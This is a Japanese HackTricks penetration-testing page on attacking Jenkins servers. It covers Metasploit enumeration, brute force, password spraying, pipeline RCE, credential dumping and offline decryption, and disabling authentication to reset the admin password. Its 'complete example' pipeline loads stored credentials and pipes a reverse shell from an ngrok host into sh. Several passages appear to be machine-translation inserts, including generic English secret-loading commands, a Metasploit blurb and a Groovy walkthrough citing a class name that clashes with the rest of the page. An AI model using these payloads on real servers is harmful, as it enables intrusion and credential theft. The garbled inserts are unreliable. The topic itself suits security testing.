# Jenkinsのセキュリティ

<details>

<summary><strong>HackTricksをサポートして特典を得る！</strong></summary>

* **HackTricksで会社を宣伝したい**場合や、**PEASSの最新バージョンを入手したい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れる
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけて、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションを発見する
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で私をフォローする 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)
* **ハッキングのトリックを共有する**ために、[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。

</details>

## 基本情報

Jenkinsは、パイプラインを使用して、**ほとんどの**言語とソースコードリポジトリの**組み合わせ**に対して、**継続的な統合**または**継続的なデリバリー**（CI/CD）環境を簡単に設定する方法を提供しています。また、他の開発タスクの自動化も行います。Jenkinsは、個々のステップのスクリプト作成の**必要性を排除するわけではありません**が、ビルド、テスト、デプロイメントツールのすべてのチェーンを統合するための、より迅速かつ堅牢な方法を提供します。\
[ここ](https://www.infoworld.com/article/3239666/what-is-jenkins-the-ci-server-explained.html)からの定義。

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

## 認証されていない列挙

認証なしで興味深いJenkinsのページ（_/people_や_/asynchPeople_など、現在のユーザーのリスト）を検索するためには、次のコマンドを使用できます：
```
msf> use auxiliary/scanner/http/jenkins_enum
```
認証なしでコマンドを実行できるかどうかを確認してください：
```
msf> use auxiliary/scanner/http/jenkins_command
```
認証情報がなくても、_**/asynchPeople/**_ パスまたは _**/securityRealm/user/admin/search/index?q=**_ で **ユーザー名** を確認することができます。

Jenkinsのバージョンは、_**/oops**_ または _**/error**_ のパスから取得できる場合があります。

![](<../../.gitbook/assets/image (48).png>)

### 既知の脆弱性

{% embed url="https://github.com/gquere/pwn_jenkins" %}

## ログイン

基本情報では、**Jenkinsにログインする方法** をすべて確認できます：

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### 登録

Jenkinsのインスタンスを見つけることができます。**アカウントを作成してログインすることができます。それほど簡単です。**

### **SSOログイン**

また、**SSO機能/プラグイン**が存在する場合は、テストアカウント（つまり、テスト**Github/Bitbucketアカウント**）を使用してアプリケーションに**ログイン**を試みる必要があります。[**ここ**](https://emtunc.org/blog/01/2018/research-misconfigured-jenkins-servers/)のトリックを使用します。

### ブルートフォース

**Jenkins** は、パスワードポリシーまたはユーザー名の **ブルートフォース対策** を実装していません。そのため、おそらく **弱いパスワード**（ユーザー名そのままのパスワードや**逆のユーザー名**をパスワードとして使用している場合もあります）を使用しているため、常にユーザーの **ブルートフォース** を試すべきです。
```
msf> use auxiliary/scanner/http/jenkins_login
```
### パスワードスプレー

[このPythonスクリプト](https://github.com/gquere/pwn_jenkins/blob/master/password_spraying/jenkins_password_spraying.py)または[このPowerShellスクリプト](https://github.com/chryzsh/JenkinsPasswordSpray)を使用します。

### IPホワイトリスト回避

多くの組織は、**GitHubやGitLab**のような**SaaSベースのソースコントロール管理（SCM）システム**と、**JenkinsやTeamCity**などの**内部の自己ホスト型CIソリューション**を組み合わせて使用しています。これにより、CIシステムは**SaaSソースコントロールベンダーからのウェブフックイベントを受け取り**、パイプラインジョブをトリガーするために使用されます。

したがって、組織は**SCMのIP範囲をホワイトリスト**に登録し、**ウェブフック**を介して**内部のCIシステム**に到達できるようにしています。ただし、**誰でも**GitHubやGitLabでアカウントを作成し、**ウェブフックをトリガー**することができ、それによって**内部のCIシステム**にリクエストを送信することができることに注意してください。

{% content-ref url="scm-ip-whitelisting-bypass.md" %}
[scm-ip-whitelisting-bypass.md](scm-ip-whitelisting-bypass.md)
{% endcontent-ref %}

## 内部のJenkinsの悪用

これらのシナリオでは、Jenkinsにアクセスするための有効なアカウントを持っていると仮定します。

{% hint style="warning" %}
Jenkinsで構成された**認証**メカニズムと侵害されたユーザーの権限によっては、以下の攻撃を実行できるかどうかが異なる場合があります。
{% endhint %}

詳細については、基本情報を確認してください：

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### ユーザーの一覧表示

Jenkinsにアクセスできる場合、他の登録済みユーザーを[http://127.0.0.1:8080/asynchPeople/](http://127.0.0.1:8080/asynchPeople/)で一覧表示できます。

### クリアテキストの秘密を見つけるためにビルドをダンプする

[このスクリプト](https://github.com/gquere/pwn_jenkins/blob/master/dump_builds/jenkins_dump_builds.py)を使用して、ビルドのコンソール出力とビルド環境変数をダンプし、クリアテキストの秘密を見つけることができます。
```bash
python3 jenkins_dump_builds.py -u alice -p alice http://127.0.0.1:8080/ -o build_dumps
cd build_dumps
gitleaks detect --no-git -v
```
### **SSH資格情報の盗み出し**

侵害されたユーザーが**新しいJenkinsノードを作成/変更する権限を持っている**場合、既に他のノードにアクセスするために使用されるSSH資格情報を**盗み出す**ことができます。これは、ホストキーを検証せずに資格情報を記録するホストを設定することによって行われます。

![](<../../.gitbook/assets/image (56).png>)

通常、JenkinsのSSH資格情報は**グローバルプロバイダ**（`/credentials/`）に保存されているため、他の秘密情報と同様にダンプすることができます。詳細は[**秘密情報のダンプセクション**](./#dumping-secrets)を参照してください。

### **JenkinsでのRCE（リモートコード実行）**

Jenkinsサーバーで**シェルを取得**すると、攻撃者はすべての**秘密情報**や**環境変数**を漏洩させ、同じネットワークにある他のマシンを**攻撃**したり、さらには**クラウドの資格情報を収集**したりする機会を得ることができます。

デフォルトでは、Jenkinsは**「システムとして実行する」ビルド**を行います。つまり、ビルド中に実行されるすべてのアクションには、自由に行動できる**全能のSYSTEMユーザー**の権限が付与されます。

### **プロジェクトの作成/変更によるRCE**

プロジェクトの作成/変更は、Jenkinsサーバー上でRCEを取得する方法です：

{% content-ref url="jenkins-rce-creating-modifying-project.md" %}
[jenkins-rce-creating-modifying-project.md](jenkins-rce-creating-modifying-project.md)
{% endcontent-ref %}

### **Groovyスクリプトの実行によるRCE**

新しいプロジェクトを作成するよりもステルス性が高い場合、Groovyスクリプトを実行することでRCEを取得することもできます：

{% content-ref url="jenkins-rce-with-groovy-script.md" %}
[jenkins-rce-with-groovy-script.md](jenkins-rce-with-groovy-script.md)
{% endcontent-ref %}

### パイプラインの作成/変更によるRCE

パイプラインの作成/変更によっても**RCEを取得**することができます：

{% content-ref url="jenkins-rce-creating-modifying-pipeline.md" %}
[jenkins-rce-creating-modifying-pipeline.md](jenkins-rce-creating-modifying-pipeline.md)
{% endcontent-ref %}

## パイプラインの悪用

パイプラインを悪用するには、まずJenkinsへのアクセス権が必要です。

### ビルドパイプライン

パイプラインは、プロジェクトの**ビルドメカニズムとしても使用**できます。その場合、パイプライン構文が含まれる**リポジトリ内のファイル**を設定することができます。デフォルトでは、`/Jenkinsfile`が使用されます：

![](<../../.gitbook/assets/image (14) (1) (1).png>)

パイプライン構成ファイルを**他の場所**（たとえば他のリポジトリ）に保存することも可能です。これにより、リポジトリの**アクセス**とパイプラインのアクセスを**分離**することができます。

攻撃者がそのファイルに**書き込みアクセス**を持っている場合、Jenkinsにアクセスせずにパイプラインを**変更**し、**トリガー**することができます。\
攻撃者は、プラットフォームとユーザーの権限によっては、いくつかのブランチ保護を**バイパスする必要がある**場合があります。

カスタムパイプラインを実行するための最も一般的なトリガーは次のとおりです：

* メインブランチへの**プルリクエスト**（または他のブランチへの可能性もあります）
* メインブランチへの**プッシュ**（または他のブランチへの可能性もあります）
* メインブランチの**更新**と、何らかの方法で実行されるまでの待機

{% hint style="info" %}
**外部ユーザー**の場合、他のユーザー/組織のリポジトリの**メインブランチにPRを作成**し、**パイプラインをトリガー**することは期待しないでください...ただし、**構成が不適切**な場合は、これを悪用することで企業を完全に**侵害**することができます。
{% endhint %}

### パイプラインRCE

以前のRCEセクションでは、[**パイプラインを変更することでRCEを取得**](./#rce-creating-modifying-pipeline)するためのテクニックが既に示されています。

### 環境変数のチェック

パイプライン全体または特定のステージのために**クリアテキストの環境変数**を宣言することができます。これらの環境変数には**機密情報は含まれていないはず**ですが、攻撃者は常にすべてのパイプライン構成/Jenkinsfileを**チェック**することができます。
```bash
pipeline {
agent {label 'built-in'}
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
```
### シークレットのダンプ

Jenkinsでシークレットが通常どのように扱われるかについての情報は、基本情報を参照してください：

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

資格情報は、グローバルプロバイダー（`/credentials/`）または特定のプロジェクト（`/job/<project-name>/configure`）にスコープを設定することができます。したがって、すべてのシークレットを外部に流出させるには、シークレットを含むすべてのプロジェクトを少なくとも侵害し、カスタム/改ざんされたパイプラインを実行する必要があります。

もう1つの問題は、パイプラインの環境内のシークレットを取得するには、シークレットの名前とタイプを知る必要があるということです。たとえば、`usernamePassword`のシークレットを`string`のシークレットとしてロードしようとすると、次のエラーが発生します：
```
ERROR: Credentials 'flag2' is of type 'Username with password' where 'org.jenkinsci.plugins.plaincredentials.StringCredentials' was expected
```
以下は、一部の一般的な秘密タイプを読み込む方法です：

```markdown
## Load Secrets from Files

To load secrets from files, you can use the following methods:

### SSH Private Key

To load an SSH private key from a file, use the following command:

```bash
cat /path/to/private_key
```

### API Keys

To load an API key from a file, use the following command:

```bash
cat /path/to/api_key
```

### Passwords

To load a password from a file, use the following command:

```bash
cat /path/to/password
```

## Load Secrets from Environment Variables

To load secrets from environment variables, you can use the following methods:

### SSH Private Key

To load an SSH private key from an environment variable, use the following command:

```bash
echo $SSH_PRIVATE_KEY
```

### API Keys

To load an API key from an environment variable, use the following command:

```bash
echo $API_KEY
```

### Passwords

To load a password from an environment variable, use the following command:

```bash
echo $PASSWORD
```
```
```bash
withCredentials([usernamePassword(credentialsId: 'flag2', usernameVariable: 'USERNAME', passwordVariable: 'PASS')]) {
sh '''
env #Search for USERNAME and PASS
'''
}

withCredentials([string(credentialsId: 'flag1', variable: 'SECRET')]) {
sh '''
env #Search for SECRET
'''
}

withCredentials([usernameColonPassword(credentialsId: 'mylogin', variable: 'USERPASS')]) {
sh '''
env # Search for USERPASS
'''
}

# You can also load multiple env variables at once
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
env
'''
}
```
このページの最後には、**すべての資格情報のタイプ**が見つかります：[https://www.jenkins.io/doc/pipeline/steps/credentials-binding/](https://www.jenkins.io/doc/pipeline/steps/credentials-binding/)

{% hint style="warning" %}
**一度にすべての秘密情報をダンプする**最良の方法は、**Jenkins**マシンを**侵害**することです（例えば**組み込みノード**に逆シェルを実行する）ことで、その後オフラインで**マスターキー**と**暗号化された秘密情報**を**漏洩**させて復号化することです。\
これについては、[ノードとエージェントのセクション](./#nodes-and-agents)と[ポストエクスプロイテーションのセクション](./#post-exploitation)で詳しく説明します。
{% endhint %}

### トリガー

[ドキュメント](https://www.jenkins.io/doc/book/pipeline/syntax/#triggers)によると、`triggers`ディレクティブは、**パイプラインが再トリガーされる自動化方法**を定義します。GitHubやBitBucketなどのソースと統合されたパイプラインの場合、`triggers`は必要ないかもしれません。ウェブフックベースの統合は既に存在している可能性があります。現在利用可能なトリガーは、`cron`、`pollSCM`、`upstream`です。

cronの例：
```bash
triggers { cron('H */4 * * 1-5') }
```
他の例については、ドキュメントを参照してください。

### ノードとエージェント

**Jenkinsインスタンス**には、**異なるマシンで実行されるさまざまなエージェント**が存在する場合があります。攻撃者の観点からは、異なるマシンへのアクセスは、盗まれる可能性のある**異なるクラウドの資格情報**や、他のマシンを悪用して攻撃するために悪用できる**異なるネットワークアクセス**を意味します。

詳細については、基本情報を確認してください：

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

`/computer/`で**構成されたノード**を列挙することができます。通常、\*\*`Built-In Node` \*\*（Jenkinsを実行しているノード）とその他のノードが見つかるでしょう：

![](<../../.gitbook/assets/image (25).png>)

**Built-Inノードを侵害することは特に興味深い**です。なぜなら、それにはJenkinsの機密情報が含まれているからです。

パイプラインで**ビルトインのJenkinsノードで実行**することを示すには、次の設定をパイプライン内に指定します：
```bash
pipeline {
agent {label 'built-in'}
```
### 完全な例

特定のエージェントでのパイプライン、cronトリガー、パイプラインとステージの環境変数を使用し、ステップで2つの変数をロードし、逆シェルを送信する。
```bash
pipeline {
agent {label 'built-in'}
triggers { cron('H */4 * * 1-5') }
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
curl https://reverse-shell.sh/0.tcp.ngrok.io:16287 | sh PASS
'''
}
}
}

post {
always {
cleanWs()
}
}
}
```
Metasploit is a powerful framework for post-exploitation activities. It provides a wide range of modules and tools that can be used to further exploit a compromised system. Some of the key features of Metasploit include:

- **Payloads**: Metasploit offers a variety of payloads that can be used to deliver malicious code to a target system. These payloads can be customized to suit specific needs, such as establishing a reverse shell or executing arbitrary commands.

- **Exploits**: Metasploit includes a large collection of exploits for various vulnerabilities. These exploits can be used to gain unauthorized access to a target system and escalate privileges.

- **Post-exploitation Modules**: Metasploit provides a set of post-exploitation modules that can be used to gather information, manipulate the compromised system, and maintain persistence. These modules can be used to perform tasks such as extracting passwords, capturing screenshots, and pivoting to other systems on the network.

- **Meterpreter**: Meterpreter is a powerful payload included in Metasploit that provides an interactive shell on the target system. It allows for advanced post-exploitation activities, such as file system manipulation, process management, and network reconnaissance.

Metasploit is a versatile tool that can be used by both ethical hackers and malicious actors. It is important to use Metasploit responsibly and within the boundaries of the law.
```
msf> post/multi/gather/jenkins_gather
```
### Jenkinsの秘密

十分な権限がある場合、`/credentials/`にアクセスして秘密をリストすることができます。ただし、これは`credentials.xml`ファイル内の秘密のみをリストしますが、**ビルド構成ファイル**にはさらに**他の資格情報**が含まれている場合があります。

各プロジェクトの構成を見ることができる場合、リポジトリにアクセスするために使用される**資格情報（秘密）の名前**や**プロジェクトの他の資格情報**もそこで確認することができます。

![](<../../.gitbook/assets/image (9) (1) (1).png>)

#### Groovyから

{% content-ref url="jenkins-dumping-secrets-from-groovy.md" %}
[jenkins-dumping-secrets-from-groovy.md](jenkins-dumping-secrets-from-groovy.md)
{% endcontent-ref %}

#### ディスクから

これらのファイルはJenkinsの秘密を復号化するために必要です：

* secrets/master.key
* secrets/hudson.util.Secret

このような**秘密は通常以下の場所に見つかります**：

* credentials.xml
* jobs/.../build.xml
* jobs/.../config.xml

以下はそれらを見つけるための正規表現です：
```bash
# Find the secrets
grep -re "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"
# Print only the filenames where the secrets are located
grep -lre "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"

# Secret example
credentials.xml: <secret>{AQAAABAAAAAwsSbQDNcKIRQMjEMYYJeSIxi2d3MHmsfW3d1Y52KMOmZ9tLYyOzTSvNoTXdvHpx/kkEbRZS9OYoqzGsIFXtg7cw==}</secret>
```
#### オフラインでJenkinsの秘密を復号化する

もし、**秘密を復号化するために必要なパスワードをダンプした**場合は、[**このスクリプト**](https://github.com/gquere/pwn\_jenkins/blob/master/offline\_decryption/jenkins\_offline\_decrypt.py)を使用して、**それらの秘密を復号化**してください。
```bash
python3 jenkins_offline_decrypt.py master.key hudson.util.Secret cred.xml
06165DF2-C047-4402-8CAB-1C8EC526C115
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAt985Hbb8KfIImS6dZlVG6swiotCiIlg/P7aME9PvZNUgg2Iyf2FT
```
#### GroovyからJenkinsの秘密を復号化する

If you have access to the Jenkins master server, you can decrypt the secrets stored in Jenkins using Groovy scripts. This can be useful during a penetration test or security assessment to uncover sensitive information.

以下の手順に従って、Jenkinsのマスターサーバーにアクセスし、Groovyスクリプトを使用してJenkinsに保存されている秘密を復号化することができます。これは、ペネトレーションテストやセキュリティ評価中に、機密情報を明らかにするために役立ちます。

1. Log in to the Jenkins master server.

   Jenkinsのマスターサーバーにログインします。

2. Navigate to the "Script Console" page.

   「スクリプトコンソール」ページに移動します。

3. Enter the following Groovy script to decrypt the secrets:

   以下のGroovyスクリプトを入力して、秘密を復号化します。

   ```groovy
   import jenkins.util.Secret

   def secret = Secret.decrypt("<ENCRYPTED_SECRET>")
   println(secret.getPlainText())
   ```

   Replace `<ENCRYPTED_SECRET>` with the encrypted secret you want to decrypt.

   `<ENCRYPTED_SECRET>`を復号化したい暗号化された秘密で置き換えます。

4. Click on the "Run" button to execute the script.

   スクリプトを実行するために「実行」ボタンをクリックします。

5. The decrypted secret will be printed in the console output.

   復号化された秘密は、コンソール出力に表示されます。

Note: This method requires access to the Jenkins master server and the necessary permissions to execute Groovy scripts. Use this technique responsibly and only on systems you have permission to access.

注意：この方法はJenkinsのマスターサーバーへのアクセスと、Groovyスクリプトの実行権限が必要です。このテクニックは責任を持って使用し、アクセス許可があるシステムのみで使用してください。
```bash
println(hudson.util.Secret.decrypt("{...}"))
```
### 新しい管理者ユーザーの作成

1. `/var/lib/jenkins/config.xml`または`C:\Program Files (x86)\Jenkis\`にあるJenkinsのconfig.xmlファイルにアクセスします。
2. `<useSecurity>true</useSecurity>`という単語を検索し、単語\*\*`true` \*\*を**`false`**に変更します。
1. `sed -i -e 's/<useSecurity>true</<useSecurity>false</g' config.xml`を実行します。
3. **Jenkins**サーバーを**再起動**します：`service jenkins restart`
4. もう一度Jenkinsポータルに移動し、今回はJenkinsは資格情報を要求しません。**"Manage Jenkins"**に移動して**管理者パスワードを再設定**します。
5. 設定を`<useSecurity>true</useSecurity>`に変更し、Jenkinsを**再起動**して**セキュリティ**を**有効化**します。

## 参考文献

* [https://github.com/gquere/pwn\_jenkins](https://github.com/gquere/pwn\_jenkins)
* [https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/](https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/)
* [https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password](https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password)
* [https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html](https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html)
* [https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072](https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072)

<details>

<summary><strong>ハックトリックをサポートして特典を受け取る！</strong></summary>

* **HackTricksで会社を宣伝**したい場合や、**PEASSの最新バージョンにアクセス**したい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れる
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけて、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**をフォローする。**
* **ハッキングのトリックを共有するために、PRを** [**HackTricks**](https://github.com/carlospolop/hacktricks) **と** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **のgithubリポジトリに提出してください。**

</details>
